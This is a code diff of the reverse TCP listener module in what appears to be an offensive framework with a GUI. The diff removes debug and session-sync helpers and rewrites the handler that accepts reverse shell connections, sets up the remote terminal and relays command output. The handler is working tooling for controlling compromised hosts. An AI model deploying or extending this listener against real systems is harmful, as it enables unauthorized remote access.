@@ -70,17 +70,6 @@ while True:
     }
     return payloads.get(lang.lower(), "# Payload tidak ada")
 
-def get_local_ip():
-    """Auto-detect IP yang bisa diakses dari luar (TUN/TAP, eth0, wlan0, dll)"""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except:
-        return "0.0.0.0"
-
 def safe_gui_update(gui_instance, method_name, *args):
     """Thread-safe GUI update untuk PyQt6"""
     if not gui_instance:
@@ -93,194 +82,9 @@ def safe_gui_update(gui_instance, method_name, *args):
     except Exception as e:
         print(f"GUI update error: {e}")
 
-def sync_sessions_with_gui(framework_session):
-    """Sync sessions between reverse_tcp dan GUI"""
-    try:
-        gui_sessions = framework_session.get('gui_sessions', {})
-        if not gui_sessions or not isinstance(gui_sessions, dict):
-            return
-            
-        sessions_dict = gui_sessions.get('dict', {})
-        sessions_lock = gui_sessions.get('lock')
-        
-        # Sync dari reverse_tcp ke GUI
-        with SESSIONS_LOCK:
-            for sess_id, sess_data in SESSIONS.items():
-                if sessions_lock:
-                    with sessions_lock:
-                        if sess_id not in sessions_dict:
-                            sessions_dict[sess_id] = sess_data
-                            print(f"DEBUG: Synced session {sess_id} to GUI")
-                else:
-                    if sess_id not in sessions_dict:
-                        sessions_dict[sess_id] = sess_data
-        
-        # Sync dari GUI ke reverse_tcp (jika ada session di GUI tapi tidak di reverse_tcp)
-        if sessions_lock:
-            with sessions_lock:
-                gui_session_ids = set(sessions_dict.keys())
-        else:
-            gui_session_ids = set(sessions_dict.keys())
-            
-        reverse_session_ids = set(SESSIONS.keys())
-        
-        missing_in_reverse = gui_session_ids - reverse_session_ids
-        for sess_id in missing_in_reverse:
-            print(f"DEBUG: Session {sess_id} exists in GUI but not in reverse_tcp")
-            
-    except Exception as e:
-        print(f"DEBUG: Sync error: {e}")
-
-def send_command_to_session_with_gui(sess_id, command, framework_session):
-    """Send command via GUI session data - ALTERNATIVE METHOD"""
-    print(f"DEBUG: send_command_to_session_with_gui called for {sess_id}")
-    
-    # Cari session dari GUI sessions
-    gui_sessions = framework_session.get('gui_sessions', {})
-    if not gui_sessions:
-        console.print(f"[red]❌ No GUI sessions available[/]")
-        return False
-        
-    sessions_dict = gui_sessions.get('dict', {})
-    sessions_lock = gui_sessions.get('lock')
-    
-    # Get session dari GUI
-    if sessions_lock:
-        with sessions_lock:
-            session = sessions_dict.get(sess_id)
-    else:
-        session = sessions_dict.get(sess_id)
-        
-    if not session:
-        console.print(f"[red]❌ Session {sess_id} not found in GUI sessions[/]")
-        console.print(f"[yellow]Available GUI sessions: {list(sessions_dict.keys())}[/]")
-        return False
-        
-    sock = session.get('socket')
-    if not sock:
-        console.print(f"[red]❌ No socket in GUI session {sess_id}[/]")
-        return False
-        
-    try:
-        # Send command
-        full_command = command + "\n"
-        print(f"DEBUG: Sending via GUI session: {full_command.strip()}")
-        
-        bytes_sent = sock.send(full_command.encode())
-        print(f"DEBUG: Bytes sent via GUI: {bytes_sent}")
-        
-        console.print(f"[green]✓ Command sent via GUI session: {command}[/]")
-        return True
-        
-    except Exception as e:
-        console.print(f"[red]❌ Send command via GUI error: {e}[/]")
-        return False
-    
-def verify_session_sync(self):
-    """Verify session synchronization between GUI and reverse_tcp"""
-    self.append_output("[yellow]=== SESSION SYNC VERIFICATION ===[/]")
-    
-    try:
-        from modules.payloads.reverse.reverse_tcp import SESSIONS, SESSIONS_LOCK
-        
-        with SESSIONS_LOCK:
-            reverse_sessions = set(SESSIONS.keys())
-        gui_sessions = set(self.sessions.keys())
-        
-        self.append_output(f"GUI sessions: {len(gui_sessions)}")
-        self.append_output(f"ReverseTCP sessions: {len(reverse_sessions)}")
-        
-        # Check matches
-        matches = reverse_sessions & gui_sessions
-        only_in_gui = gui_sessions - reverse_sessions
-        only_in_reverse = reverse_sessions - gui_sessions
-        
-        self.append_output(f"✓ Synced sessions: {len(matches)}")
-        self.append_output(f"⚠️ Only in GUI: {len(only_in_gui)}")
-        self.append_output(f"⚠️ Only in ReverseTCP: {len(only_in_reverse)}")
-        
-        if only_in_gui:
-            self.append_output(f"[yellow]Sessions only in GUI: {list(only_in_gui)}[/]")
-            
-        if only_in_reverse:
-            self.append_output(f"[yellow]Sessions only in ReverseTCP: {list(only_in_reverse)}[/]")
-            
-        # Check socket status for matched sessions
-        for sess_id in matches:
-            gui_has_socket = 'socket' in self.sessions[sess_id] and self.sessions[sess_id]['socket'] is not None
-            reverse_has_socket = 'socket' in SESSIONS[sess_id] and SESSIONS[sess_id]['socket'] is not None
-            
-            self.append_output(f"Session {sess_id}:")
-            self.append_output(f"  GUI socket: {'✓' if gui_has_socket else '❌'}")
-            self.append_output(f"  ReverseTCP socket: {'✓' if reverse_has_socket else '❌'}")
-    
-    except Exception as e:
-        self.append_output(f"[red]Verification error: {e}[/]")
-    
-    self.append_output("[yellow]================================[/]")
-
-def send_command_to_session(sess_id, command):
-    """Kirim command ke session - EXTENDED DEBUG VERSION"""
-    print(f"DEBUG: send_command_to_session called for {sess_id}")
-    
-    with SESSIONS_LOCK:
-        session = SESSIONS.get(sess_id)
-        print(f"DEBUG: Session in SESSIONS: {session is not None}")
-        
-        if session:
-            print(f"DEBUG: Session keys: {session.keys()}")
-            print(f"DEBUG: Socket in session: {'socket' in session}")
-
-    if not session:
-        console.print(f"[red]❌ Session {sess_id} not found in SESSIONS[/]")
-        console.print(f"[yellow]Available sessions: {list(SESSIONS.keys())}[/]")
-        return False
-
-    sock = session.get('socket')
-    if not sock:
-        console.print(f"[red]❌ No socket for session {sess_id}[/]")
-        return False
-
-    try:
-        # Debug socket status
-        print(f"DEBUG: Socket type: {type(sock)}")
-        print(f"DEBUG: Socket fileno: {sock.fileno() if hasattr(sock, 'fileno') else 'N/A'}")
-        
-        # Test if socket is still connected
-        try:
-            # Non-blocking check
-            import select
-            ready = select.select([], [sock], [], 0.1)
-            if ready[1]:  # Socket writable
-                print("DEBUG: Socket is writable")
-            else:
-                print("DEBUG: Socket may be closed")
-        except Exception as e:
-            print(f"DEBUG: Socket check error: {e}")
-            console.print(f"[red]❌ Socket error: {e}[/]")
-            return False
-
-        # Send command
-        full_command = command + "\n"
-        print(f"DEBUG: Sending command: {full_command.strip()}")
-        
-        bytes_sent = sock.send(full_command.encode())
-        print(f"DEBUG: Bytes sent: {bytes_sent}")
-        
-        console.print(f"[green]✓ Command sent to {sess_id}: {command}[/]")
-        console.print(f"[dim]Bytes sent: {bytes_sent}[/]")
-        return True
-        
-    except Exception as e:
-        console.print(f"[red]❌ Send command error: {e}[/]")
-        print(f"DEBUG: Exception details: {type(e).__name__}: {e}")
-        return False
-
 def handler(client_sock, addr, framework_session):
-    """Handle incoming reverse shell connections - ENHANCED VERSION"""
+    """Handle incoming reverse shell connections"""
     sess_id = f"{addr[0]}:{addr[1]}"
-    
-    print(f"DEBUG: New connection from {addr}, session ID: {sess_id}")
     
     # Get GUI instance from framework session
     gui_instance = framework_session.get('gui_instance')
@@ -293,18 +97,17 @@ def handler(client_sock, addr, framework_session):
         'ip': addr[0],
         'port': addr[1],
         'type': 'reverse_tcp',
-        'cwd': '/',
-        'output': f"[*] Session {sess_id} created\nType: reverse_tcp\nSource: {addr[0]}:{addr[1]}\n\n",
+        'lhost': framework_session.get('LHOST', '0.0.0.0'),
+        'lport': framework_session.get('LPORT', 4444),
+        'rhost': addr[0],
+        'rport': addr[1],
+        'output': f"[*] Session {sess_id} created\nType: reverse_tcp\nLHOST: {framework_session.get('LHOST', '0.0.0.0')}\nLPORT: {framework_session.get('LPORT', 4444)}\n\n",
+        'handler': None,
         'status': 'alive',
         'created': time.strftime("%H:%M:%S")
     }
 
-    # Simpan ke semua session storage
-    with SESSIONS_LOCK:
-        SESSIONS[sess_id] = session_data
-        print(f"DEBUG: Session {sess_id} added to SESSIONS")
-
-    # Simpan ke GUI sessions
+    # === CRITICAL: Simpan ke GUI sessions ===
     if gui_sessions and isinstance(gui_sessions, dict):
         sessions_dict = gui_sessions.get('dict', {})
         sessions_lock = gui_sessions.get('lock')
@@ -314,89 +117,85 @@ def handler(client_sock, addr, framework_session):
                 sessions_dict[sess_id] = session_data
         else:
             sessions_dict[sess_id] = session_data
-        print(f"DEBUG: Session {sess_id} added to GUI sessions")
 
-    # Output untuk GUI
-    console.print(f"\n[bold green][+] Session {sess_id} opened[/]")
+    # Simpan ke global sessions juga
+    with SESSIONS_LOCK:
+        SESSIONS[sess_id] = session_data
+
+    # === CRITICAL: Output yang DIBACA oleh GUI auto-detection ===
+    # Pattern yang akan dideteksi oleh GUI: "Session IP:PORT opened (SRC -> DST)"
+    output_pattern = f"Session {sess_id} opened ({addr[0]}:{addr[1]} -> {framework_session.get('LHOST', '0.0.0.0')}:{framework_session.get('LPORT', 4444)})"
+    console.print(f"\n[bold green][+] {output_pattern}[/]")
     
     # Thread-safe GUI update
     safe_gui_update(gui_instance, "update_sessions_ui")
+    
+    # Auto-switch ke sessions tab
     safe_gui_update(gui_instance, "switch_to_sessions_tab")
 
-    # Setup shell dengan lebih robust
+    # Setup shell bersih
     try:
-        time.sleep(0.5)
-        client_sock.send(b"echo '[*] Shell initialized successfully'\n")
-        time.sleep(0.2)
-        client_sock.send(b"pwd\n")  # Auto-get current directory
-    except Exception as e:
-        console.print(f"[yellow]Shell setup warning: {e}[/]")
+        client_sock.send(b"export TERM=xterm-256color; stty raw -echo; clear\n")
+        time.sleep(0.4)
+        client_sock.send(b"export PS1=''\n")
+    except: 
+        pass
 
-    # Main handler loop
     try:
-        buffer = ""
         while True:
-            # Check if socket is still connected
-            try:
-                ready = select.select([client_sock], [], [], 1)
-                if ready[0]:
-                    data = client_sock.recv(1024)
-                    if not data: 
-                        print(f"DEBUG: No data received, connection closed")
-                        break
-                        
-                    # Process received data
-                    raw_output = data.decode('utf-8', errors='ignore')
-                    buffer += raw_output
+            r, _, _ = select.select([client_sock], [], [], 0.3)
+            if r:
+                data = client_sock.recv(4096)
+                if not data: 
+                    break
                     
-                    # Process complete lines
-                    while '\n' in buffer:
-                        line, buffer = buffer.split('\n', 1)
-                        line = line.strip()
-                        
-                        if not line:
-                            continue
-                            
-                        # Filter out noise
-                        if any(noise in line for noise in ["__CWD__:", "stty", "export TERM", "clear"]):
-                            continue
-                            
-                        # Process CWD updates
-                        if line.startswith("__CWD__:"):
-                            try:
-                                new_cwd = line.split(":", 1)[1].strip()
-                                with SESSIONS_LOCK:
-                                    if sess_id in SESSIONS:
-                                        SESSIONS[sess_id]['cwd'] = new_cwd
-                                continue
-                            except:
-                                continue
-                                
-                        # Normal output
-                        print(f"DEBUG: Session {sess_id} output: {line}")
-                        
-                        # Update semua session storage
-                        with SESSIONS_LOCK:
-                            if sess_id in SESSIONS:
-                                SESSIONS[sess_id]['output'] += line + "\n"
-                        
-                        # Update GUI
-                        safe_gui_update(gui_instance, "append_session_output", sess_id, line)
-                        
-            except socket.error as e:
-                print(f"DEBUG: Socket error in handler: {e}")
-                break
-            except Exception as e:
-                print(f"DEBUG: Handler error: {e}")
-                break
-                
+                raw = data.decode('utf-8', errors='replace')
+                for line in raw.replace('\r','').split('\n'):
+                    line = line.strip()
+                    if not line: 
+                        continue
+                    if any(x in line for x in [sess_id, "lazy1", "$ ", "# ", "PS1", "stty", "clear"]): 
+                        continue
+
+                    # Update session output
+                    with SESSIONS_LOCK:
+                        if sess_id in SESSIONS:
+                            SESSIONS[sess_id]['output'] += line + "\n"
+                    
+                    # Update GUI sessions juga
+                    if gui_sessions and isinstance(gui_sessions, dict):
+                        sessions_dict = gui_sessions.get('dict', {})
+                        if sess_id in sessions_dict:
+                            sessions_dict[sess_id]['output'] += line + "\n"
+                    
+                    # Update GUI output thread-safe
+                    safe_gui_update(gui_instance, "append_session_output", sess_id, line)
+
     except Exception as e:
-        console.print(f"[red]❌ Handler error: {e}[/]")
+        console.print(f"[red]Handler error: {e}[/]")
     finally:
-        print(f"DEBUG: Cleaning up session {sess_id}")
-        # Cleanup code...
-
-
+        # Cleanup
+        try:
+            client_sock.close()
+        except:
+            pass
+            
+        with SESSIONS_LOCK:
+            SESSIONS.pop(sess_id, None)
+            
+        # Update GUI sessions
+        if gui_sessions and isinstance(gui_sessions, dict):
+            sessions_dict = gui_sessions.get('dict', {})
+            sessions_lock = gui_sessions.get('lock')
+            
+            if sessions_lock:
+                with sessions_lock:
+                    sessions_dict.pop(sess_id, None)
+            else:
+                sessions_dict.pop(sess_id, None)
+                
+        safe_gui_update(gui_instance, "update_sessions_ui")
+        console.print(f"[bold red][-] Session {sess_id} closed[/]\n")
 
 def start_listener(lhost, lport, framework_session):
     """Start TCP listener"""
